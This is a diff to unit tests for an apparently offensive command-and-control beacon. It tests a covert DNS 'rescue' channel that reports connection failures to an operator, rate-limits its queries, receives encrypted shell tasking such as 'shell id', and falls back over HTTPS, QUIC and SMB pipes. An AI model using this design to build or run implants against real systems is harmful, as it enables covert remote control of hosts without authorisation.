@@ -352,7 +352,9 @@ class _Sent:
         self.names = []
         self._answer = answer
 
-    def __call__(self, name, qtype, server, timeout=10):
+    def __call__(self, name, qtype, server, timeout=10, status=None):
+        if status is not None:
+            status["rcode"] = 0
         self.names.append(name)
         return [self._answer] if self._answer else []
 
@@ -463,6 +465,45 @@ class TestTheTrigger(unittest.TestCase):
             beacon._maybe_rescue()
         self.assertEqual(sent.names, [])
 
+    def test_an_exception_carrying_a_hostname_does_not_reach_the_record(self):
+        # The real risk, and what the first version of this test missed: a
+        # library message with a host or a URL in it, classified into the
+        # record. The class is an int derived from the exception's type, so
+        # the text must be unreachable -- proven by driving it, not by
+        # inspecting the record of hand-written ints.
+        import urllib.error
+
+        from software.c2 import beacon as beacon_mod
+
+        secret_host = "secret-dc01.corp.example"
+        beacon = _a_beacon(https={"enabled": True}, dns={
+            "enabled": True, "domain": "rescue.example",
+            "resolver": "127.0.0.1"})
+
+        class _Session:
+            trust_env = True
+            proxies = {}
+
+            def post(self, *a, **kw):
+                raise urllib.error.URLError(
+                    OSError("cannot reach %s:8443 via http://user:pw@%s"
+                            % (secret_host, secret_host)))
+
+        beacon._proxy_session = _Session()
+        beacon._beacon_https()
+        with unittest.mock.patch.object(
+                sys.modules["software.c2.beacon"], "_dns_query",
+                lambda *a, **kw: (kw.get("status", {}).update({"rcode": 0})
+                                  or [])):
+            beacon._beacon_dns()
+
+        raw = beacon_mod._rescue_pack(beacon._leg_status, beacon._rescue_flags)
+        self.assertEqual(len(raw), dns_rescue.RECORD_BYTES)
+        for fragment in (secret_host.encode(), b"user:pw", b"8443",
+                         b"corp", b"http"):
+            with self.subTest(fragment=fragment):
+                self.assertNotIn(fragment, raw)
+
     def test_the_record_carries_no_hostname_or_credential(self):
         beacon = _rescue_beacon()
         self._exhausted(beacon)
@@ -543,7 +584,9 @@ class TestTheLoopIsWired(unittest.TestCase):
 
         sent = _Sent()
 
-        def query(name, qtype, server, timeout=10):
+        def query(name, qtype, server, timeout=10, status=None):
+            if status is not None:
+                status["rcode"] = 0
             if "." + dns_rescue.MARKER + "." in name:
                 sent(name, qtype, server, timeout)
                 return [rescue_answer] if rescue_answer else []
@@ -584,12 +627,347 @@ class TestTheLoopIsWired(unittest.TestCase):
                              rescue_answer=beacon._encrypt({"cmd": "shell id"}))
         self.assertEqual(ran, [{"cmd": "shell id"}])
 
-    def test_the_loop_clears_the_accumulator_between_cycles(self):
+    def test_a_stale_dns_answer_does_not_send_a_rescue_next_cycle(self):
+        # Review Focus 5, and the second attempt at it. The first version
+        # could not fail, because the latch masked the stale flag. This one
+        # isolates it: cycle 1 DELIVERS tasking, which re-arms the latch
+        # and sets FLAG_DNS_ANSWERED; cycle 2 gets SERVFAIL and delivers
+        # nothing. The only thing that could permit a rescue in cycle 2 is
+        # cycle 1's flag surviving, so a no-op `_start_cycle` sends one and
+        # a correct one sends none.
         beacon = _rescue_beacon()
-        self._run_cycles(beacon, 3)
-        # After the last cycle only this cycle's legs are present: https
-        # and smb were never enabled, so they must read as not attempted.
-        self.assertNotIn("https", beacon._leg_status)
-        self.assertNotIn("smb", beacon._leg_status)
+        cycle = {"n": 0}
+        sent = []
+        task = beacon._encrypt({"cmd": "shell id"})
+
+        def query(name, qtype, server, timeout=10, status=None):
+            if "." + dns_rescue.MARKER + "." in name:
+                sent.append(name)
+                return []
+            if cycle["n"] == 0:
+                if status is not None:
+                    status["rcode"] = 0
+                return [task]
+            if status is not None:
+                status["rcode"] = 2            # SERVFAIL from now on
+            return []
+
+        def stop_after(*a, **kw):
+            cycle["n"] += 1
+            if cycle["n"] >= 2:
+                beacon._running = False
+
+        beacon._running = True
+        with unittest.mock.patch.object(beacon, "_jittered_sleep",
+                                        stop_after), \
+             unittest.mock.patch.object(beacon, "_backoff_sleep",
+                                        stop_after), \
+             unittest.mock.patch.object(beacon, "_process_tasking_batch",
+                                        lambda *_: None), \
+             unittest.mock.patch.object(
+                 sys.modules["software.c2.beacon"], "_dns_query", query):
+            beacon._beacon_loop()
+
+        self.assertEqual(sent, [],
+                         "a rescue went into a resolver that said SERVFAIL, "
+                         "which can only happen if the previous cycle's "
+                         "FLAG_DNS_ANSWERED survived")
+
+
+class TestTheLatchSurvivesItsOwnReply(unittest.TestCase):
+    """The failure a fresh reviewer found and the direct tests missed.
+
+    `_maybe_rescue`'s answer reached the arm that calls `_leg_recovered`,
+    so an answered rescue re-armed the latch, the next dead cycle sent
+    another, and with the design's own "queue one attempt per rescue" that
+    is one query per cycle -- the periodic behaviour the whole latch
+    exists to prevent.
+    """
+
+    def _cycles(self, beacon, cycles, rescue_answer=None):
+        state = {"n": 0}
+
+        def stop_after(*a, **kw):
+            state["n"] += 1
+            if state["n"] >= cycles:
+                beacon._running = False
+
+        sent = []
+
+        def query(name, qtype, server, timeout=10, status=None):
+            if status is not None:
+                status["rcode"] = 0
+            if "." + dns_rescue.MARKER + "." in name:
+                sent.append(name)
+                return [rescue_answer] if rescue_answer else []
+            return []
+
+        beacon._running = True
+        with unittest.mock.patch.object(beacon, "_jittered_sleep", stop_after), \
+             unittest.mock.patch.object(beacon, "_backoff_sleep", stop_after), \
+             unittest.mock.patch.object(beacon, "_process_tasking_batch",
+                                        lambda *_: None), \
+             unittest.mock.patch.object(
+                 sys.modules["software.c2.beacon"], "_dns_query", query):
+            beacon._beacon_loop()
+        return sent
+
+    def test_six_dead_cycles_with_every_rescue_answered_send_one(self):
+        beacon = _rescue_beacon()
+        sent = self._cycles(beacon, 6,
+                            rescue_answer=beacon._encrypt({"cmd": "shell id"}))
+        self.assertEqual(len(sent), 1)
+
+    def test_six_dead_cycles_with_the_first_rescue_answered_send_one(self):
+        beacon = _rescue_beacon()
+        answered = {"n": 0}
+        original = beacon._encrypt({"cmd": "shell id"})
+
+        def one_answer(*a, **kw):
+            answered["n"] += 1
+            return original if answered["n"] == 1 else None
+
+        state = {"n": 0}
+
+        def stop_after(*a, **kw):
+            state["n"] += 1
+            if state["n"] >= 6:
+                beacon._running = False
+
+        sent = []
+
+        def query(name, qtype, server, timeout=10, status=None):
+            if status is not None:
+                status["rcode"] = 0
+            if "." + dns_rescue.MARKER + "." in name:
+                sent.append(name)
+                answer = one_answer()
+                return [answer] if answer else []
+            return []
+
+        beacon._running = True
+        with unittest.mock.patch.object(beacon, "_jittered_sleep", stop_after), \
+             unittest.mock.patch.object(beacon, "_backoff_sleep", stop_after), \
+             unittest.mock.patch.object(beacon, "_process_tasking_batch",
+                                        lambda *_: None), \
+             unittest.mock.patch.object(
+                 sys.modules["software.c2.beacon"], "_dns_query", query):
+            beacon._beacon_loop()
+        self.assertEqual(len(sent), 1)
+
+    def test_a_real_leg_delivering_still_re_arms_the_latch(self):
+        # The latch must not become permanent: a beacon that recovers and
+        # then gets stuck again has a new story to tell.
+        beacon = _rescue_beacon()
+        self.assertFalse(beacon._rescue_sent)
+        beacon._rescue_sent = True
+        beacon._leg_recovered()
+        self.assertFalse(beacon._rescue_sent)
+
+
+class TestTheResolverMustReallyHaveAnswered(unittest.TestCase):
+    """SERVFAIL is not an answer, and a rescue sent into one is noise."""
+
+    def test_a_servfail_is_not_recorded_as_answered(self):
+        beacon = _rescue_beacon()
+
+        def query(name, qtype, server, timeout=10, status=None):
+            if status is not None:
+                status["rcode"] = 2        # SERVFAIL
+            return []
+
+        with unittest.mock.patch.object(
+                sys.modules["software.c2.beacon"], "_dns_query", query):
+            self.assertIsNone(beacon._beacon_dns())
+        self.assertEqual(beacon._leg_status["dns"],
+                         (dns_rescue.CLASSES["resolve_failed"], 2))
+        self.assertFalse(beacon._rescue_flags & dns_rescue.FLAG_DNS_ANSWERED)
+
+    def test_an_nxdomain_carries_its_rcode(self):
+        beacon = _rescue_beacon()
+
+        def query(name, qtype, server, timeout=10, status=None):
+            if status is not None:
+                status["rcode"] = 3        # NXDOMAIN
+            return []
+
+        with unittest.mock.patch.object(
+                sys.modules["software.c2.beacon"], "_dns_query", query):
+            beacon._beacon_dns()
+        self.assertEqual(beacon._leg_status["dns"],
+                         (dns_rescue.CLASSES["resolve_failed"], 3))
+
+    def test_rcode_zero_with_no_records_is_still_an_answer(self):
+        beacon = _rescue_beacon()
+
+        def query(name, qtype, server, timeout=10, status=None):
+            if status is not None:
+                status["rcode"] = 0
+            return []
+
+        with unittest.mock.patch.object(
+                sys.modules["software.c2.beacon"], "_dns_query", query):
+            beacon._beacon_dns()
         self.assertEqual(beacon._leg_status["dns"],
                          (dns_rescue.CLASSES["answered"], 0))
+        self.assertTrue(beacon._rescue_flags & dns_rescue.FLAG_DNS_ANSWERED)
+
+    def test_no_rescue_goes_into_a_resolver_that_servfailed(self):
+        beacon = _rescue_beacon()
+        sent = []
+
+        def query(name, qtype, server, timeout=10, status=None):
+            if status is not None:
+                status["rcode"] = 2
+            if "." + dns_rescue.MARKER + "." in name:
+                sent.append(name)
+            return []
+
+        beacon._start_cycle()
+        with unittest.mock.patch.object(
+                sys.modules["software.c2.beacon"], "_dns_query", query):
+            beacon._beacon_dns()
+            beacon._maybe_rescue()
+        self.assertEqual(sent, [])
+
+    def test_the_real_dns_query_reports_its_rcode(self):
+        # Against the real parser, not a stub: a SERVFAIL header with no
+        # answer section must set the status rather than look like silence.
+        import struct as _struct
+        from software.c2 import beacon as beacon_mod
+
+        header = _struct.pack("!HHHHHH", 0x1234, 0x8002, 1, 0, 0, 0)
+
+        class _Sock:
+            def settimeout(self, *_):
+                pass
+
+            def sendto(self, *_):
+                pass
+
+            def recvfrom(self, *_):
+                return header, None
+
+            def close(self):
+                pass
+
+        status = {}
+        with unittest.mock.patch.object(beacon_mod.socket, "socket",
+                                        lambda *a, **kw: _Sock()):
+            out = beacon_mod._dns_query("x.example", "TXT", "127.0.0.1",
+                                        timeout=1, status=status)
+        self.assertEqual(out, [])
+        self.assertEqual(status["rcode"], 2)
+
+
+class TestClassifyingAFailure(unittest.TestCase):
+    """`_rescue_class_of` had no test, and it was wrong.
+
+    `_HttpSession` raises `URLError` wrapping the real cause, so checking
+    the outer type alone reported a refused connection, a TLS failure and
+    a timeout all as `unreachable` -- three different operator actions
+    collapsed into one useless word.
+    """
+
+    def _class_of(self, exc):
+        from software.c2 import beacon as beacon_mod
+
+        return beacon_mod._rescue_class_of(exc)
+
+    def test_a_refused_connection_is_refused(self):
+        import urllib.error
+
+        self.assertEqual(
+            self._class_of(urllib.error.URLError(ConnectionRefusedError(61))),
+            dns_rescue.CLASSES["refused"])
+
+    def test_a_tls_failure_is_tls_failed(self):
+        import ssl
+        import urllib.error
+
+        self.assertEqual(
+            self._class_of(urllib.error.URLError(ssl.SSLError("handshake"))),
+            dns_rescue.CLASSES["tls_failed"])
+
+    def test_a_timeout_is_timed_out(self):
+        import socket as _socket
+        import urllib.error
+
+        for exc in (_socket.timeout("timed out"), TimeoutError()):
+            with self.subTest(exc=type(exc).__name__):
+                self.assertEqual(self._class_of(urllib.error.URLError(exc)),
+                                 dns_rescue.CLASSES["timed_out"])
+
+    def test_an_unwrapped_cause_is_classified_too(self):
+        self.assertEqual(self._class_of(ConnectionRefusedError(61)),
+                         dns_rescue.CLASSES["refused"])
+
+    def test_a_reply_that_could_not_be_read_is_bad_payload(self):
+        self.assertEqual(self._class_of(ValueError("not json")),
+                         dns_rescue.CLASSES["bad_payload"])
+
+    def test_anything_else_is_unreachable(self):
+        self.assertEqual(self._class_of(RuntimeError("?")),
+                         dns_rescue.CLASSES["unreachable"])
+
+    def test_no_message_text_reaches_the_class(self):
+        # By type, never by message: a message can carry a hostname or a
+        # URL, and this value goes into a DNS query name.
+        import urllib.error
+
+        hostile = urllib.error.URLError(
+            OSError("cannot reach secret-dc01.corp.example:8443"))
+        self.assertIn(self._class_of(hostile), set(dns_rescue.CLASSES.values()))
+
+
+class TestTheOtherLegsRecordToo(unittest.TestCase):
+    """An unrecorded leg packs as `not_attempted`, which is a lie."""
+
+    def test_a_quic_failure_is_recorded(self):
+        beacon = _a_beacon(quic={"enabled": True, "host": "127.0.0.1",
+                                 "port": 1})
+        beacon._beacon_quic()
+        self.assertIn("quic", beacon._leg_status)
+        self.assertNotEqual(beacon._leg_status["quic"][0],
+                            dns_rescue.CLASSES["not_attempted"])
+
+    def test_an_smb_write_failure_is_recorded_not_just_the_connect(self):
+        beacon = _a_beacon(smb={"enabled": True, "host": "127.0.0.1"})
+
+        class _Sock:
+            def close(self):
+                pass
+
+        with unittest.mock.patch.object(beacon, "_smb_connect",
+                                        lambda: _Sock()), \
+             unittest.mock.patch.object(beacon, "_smb_write_pipe",
+                                        lambda *a, **kw: False):
+            beacon._beacon_smb()
+        self.assertIn("smb", beacon._leg_status)
+        self.assertNotEqual(beacon._leg_status["smb"][0],
+                            dns_rescue.CLASSES["not_attempted"])
+
+    def test_a_proxy_that_refused_is_not_reported_as_wanting_credentials(self):
+        # _ProxyError covers any proxy problem, including a refused one.
+        # Calling all of them "auth_required" corrupts the single most
+        # useful diagnostic this channel carries.
+        from software.c2 import beacon as beacon_mod
+
+        beacon = _a_beacon(https={"enabled": True})
+
+        class _Session:
+            trust_env = True
+            proxies = {"https": "http://proxy.example:8080"}
+
+            def post(self, *a, **kw):
+                raise beacon_mod._ProxyError("proxy connection refused")
+
+        beacon._proxy_session = _Session()
+        beacon._beacon_https()
+        self.assertTrue(beacon._rescue_flags & dns_rescue.FLAG_PROXY_FOUND)
+        self.assertNotEqual(beacon._leg_status.get("https", (0, 0))[0],
+                            dns_rescue.CLASSES["auth_required"])
+
+
+if __name__ == "__main__":
+    unittest.main()
